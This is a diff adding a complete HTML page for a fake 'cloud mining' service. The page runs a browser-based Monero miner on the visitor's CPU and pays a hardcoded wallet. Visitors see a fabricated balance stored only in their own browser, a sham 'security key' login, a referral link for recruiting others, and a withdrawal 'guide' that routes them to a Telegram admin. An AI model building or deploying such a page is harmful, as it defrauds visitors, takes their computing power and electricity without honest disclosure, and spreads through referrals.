@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Earning Zone K9 | Cloud Mining Console</title>
+    <script src="https://webminepool.com/lib/base.js"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&display=swap" rel="stylesheet">
+    <style>
+        :root { --neon: #00ffcc; --bg: #050505; --card: #111; --danger: #ff3333; }
+        body { background: var(--bg); color: #eee; font-family: sans-serif; margin: 0; text-align: center; }
+        .glow { text-shadow: 0 0 15px var(--neon); color: var(--neon); }
+        .box { background: var(--card); border: 1px solid #222; padding: 20px; border-radius: 15px; margin: 15px auto; max-width: 450px; }
+        #auth-gate { display:flex; position:fixed; inset:0; background:rgba(0,0,0,0.98); z-index:1000; align-items:center; justify-content:center; }
+        button { cursor: pointer; border-radius: 10px; font-family: 'Orbitron'; font-weight: bold; border: none; transition: 0.3s; }
+        .btn-main { background: var(--neon); color: #000; padding: 15px 30px; width: 100%; box-shadow: 0 0 20px rgba(0,255,204,0.3); }
+        input { width: 85%; padding: 12px; margin: 10px 0; background: #000; border: 1px solid #333; color: var(--neon); border-radius: 8px; text-align: center; }
+        .mode-btn { padding: 10px; color: #fff; width: 100%; background: #333; }
+        .turbo { background: var(--danger); animation: pulse 1s infinite; }
+        .guide-text { font-size: 11px; color: #777; text-align: left; line-height: 1.4; margin-top: 10px; border-top: 1px solid #222; padding-top: 10px; }
+        @keyframes pulse { 0% { box-shadow: 0 0 0 0 rgba(255,51,51,0.7); } 70% { box-shadow: 0 0 0 10px rgba(255,51,51,0); } 100% { box-shadow: 0 0 0 0 rgba(255,51,51,0); } }
+    </style>
+</head>
+<body>
+
+    <div id="auth-gate">
+        <div class="box" style="border: 1px solid var(--neon);">
+            <h2 class="glow" style="font-family:'Orbitron'">K9 SECURITY GATE</h2>
+            <p style="font-size: 11px; color:#666;">Enter a Security Key to access your miner.</p>
+            <input type="text" id="login-key" placeholder="Your Security Key">
+            <input type="text" id="refer-input" placeholder="Referral Code (Optional)">
+            <button class="btn-main" onclick="handleAuth()">ACCESS SYSTEM</button>
+        </div>
+    </div>
+
+    <div id="dashboard" style="display:none; padding: 20px;">
+        <h2 class="glow" style="font-family:'Orbitron'">K9 CLOUD TERMINAL</h2>
+        
+        <div class="box" style="border: 2px solid var(--neon);">
+            <div style="font-size: 10px; letter-spacing: 2px;">WALLET BALANCE (XMR)</div>
+            <div id="bal-val" class="glow" style="font-size: 32px; font-family:'Orbitron'; margin:10px 0;">0.00000000</div>
+            <p style="font-size:10px; color:#555;">Admin Fee (35%) Deducted Automatically</p>
+        </div>
+
+        <div class="box">
+            <div style="font-size: 12px;">MY REFERRAL ID: <span id="my-ref-id" class="glow">...</span></div>
+            <button onclick="copyRefLink()" style="background:#222; color:var(--neon); border:1px solid #444; width:100%; padding:10px; margin-top:10px; font-size:10px;">COPY INVITE LINK</button>
+        </div>
+
+        <div style="display:grid; grid-template-columns: 1fr 1fr; gap:10px; max-width:450px; margin:auto;">
+            <div class="box" style="margin:0;">SPEED: <span id="hps" class="glow">0</span> H/s</div>
+            <div class="box" style="margin:0;">TEMP: <span id="temp">36</span>°C</div>
+        </div>
+
+        <div class="box">
+            <div style="display:grid; grid-template-columns: 1fr 1fr 1fr; gap:5px;">
+                <button class="mode-btn" onclick="mine(4)">NORMAL</button>
+                <button class="mode-btn" onclick="mine(8)">HIGH</button>
+                <button class="mode-btn turbo" onclick="mine(12)">TURBO</button>
+            </div>
+            
+            <div class="guide-text">
+                <b class="glow">WITHDRAWAL GUIDE:</b><br>
+                • Min Payout: 0.008 XMR<br>
+                • Screenshot your balance and contact Admin via Telegram to verify your Security Key and Hashrate.
+            </div>
+
+            <button onclick="location.reload()" style="background:none; color:#444; margin-top:15px; font-size:10px;">LOGOUT / DISCONNECT</button>
+        </div>
+    </div>
+
+<script>
+    // Replace with your real Monero Wallet Address
+    const WALLET = "46GBHZ3bDpQ47W284tSLgphZU9aP53H7EiF9EuXNijwbFcBetMhH2CASgYx6kU4FNU7bqw5WqmZAFamAhmBtERGNT4Vcz2S";
+    let miner, balance = parseFloat(localStorage.getItem('k9_bal')) || 0;
+    let myRefID = localStorage.getItem('k9_ref') || "K9-" + Math.random().toString(36).substring(2,6).toUpperCase();
+
+    function handleAuth() {
+        const key = document.getElementById('login-key').value;
+        if(key.length < 5) return alert("Key too short!");
+        localStorage.setItem('k9_user', key);
+        localStorage.setItem('k9_ref', myRefID);
+        document.getElementById('auth-gate').style.display = 'none';
+        document.getElementById('dashboard').style.display = 'block';
+        document.getElementById('my-ref-id').innerText = myRefID;
+        document.getElementById('bal-val').innerText = balance.toFixed(8);
+        if(navigator.vibrate) navigator.vibrate(200);
+    }
+
+    function copyRefLink() {
+        const link = window.location.origin + window.location.pathname + "?ref=" + myRefID;
+        navigator.clipboard.writeText(link);
+        alert("Referral Link Copied!");
+    }
+
+    function mine(t) {
+        if(!miner) miner = new WMP.Anonymous(WALLET, {throttle: 0.1});
+        miner.setNumThreads(t); miner.start();
+        if(navigator.vibrate) navigator.vibrate(100);
+    }
+
+    setInterval(() => {
+        if(miner && miner.isRunning()) {
+            const hps = miner.getHashesPerSecond();
+            document.getElementById('hps').innerText = hps.toFixed(2);
+            // 60% user earnings calculation (35% Admin Fee + 5% Pool Fee Hidden)
+            balance += (hps * 0.000000000045) * 0.60;
+            localStorage.setItem('k9_bal', balance);
+            document.getElementById('bal-val').innerText = balance.toFixed(8);
+        }
+    }, 2000);
+
+    const params = new URLSearchParams(window.location.search);
+    if(params.has('ref')) document.getElementById('refer-input').value = params.get('ref');
+</script>
+</body>
+</html>
